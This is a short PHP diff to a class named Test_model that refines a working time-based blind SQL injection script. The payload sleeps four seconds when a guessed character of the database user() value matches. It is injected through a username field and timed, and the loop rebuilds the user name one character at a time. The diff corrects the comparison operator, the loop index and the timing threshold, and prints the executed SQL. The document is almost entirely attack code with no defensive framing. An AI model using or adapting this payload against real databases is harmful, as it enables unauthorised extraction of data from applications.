@@ -17,15 +17,15 @@ class Test_model extends GT_model{
         $num = 21;
         $rand_array = getCharArr();
         $res = '';
-        for($i=0;$i<=$num;$i++){
+        for($i=1;$i<=$num;$i++){
             foreach($rand_array as $str){
                 $status = false;
                 while(true){
                     $start_time = microtime(true);
-                    $query_str ="%2b(select(0)from(select(sleep((mid(user(),".$i.",1)=='".$str."')*4)))v)%2b";
+                    $query_str ="%2b(select(0)from(select(sleep((mid(user(),".$i.",1)='".$str."')*4)))v)%2b";
                     $result = $this->findByAttr(array('username'=>$query_str));
-                    var_dump(microtime(true)-$start_time);
-                    if(microtime(true)-$start_time>4){
+                    var_dump($this->getLastSql());
+                    if(microtime(true)-$start_time>3){
                         $res .= $str;
                         $status = true;
                         sleep(1);
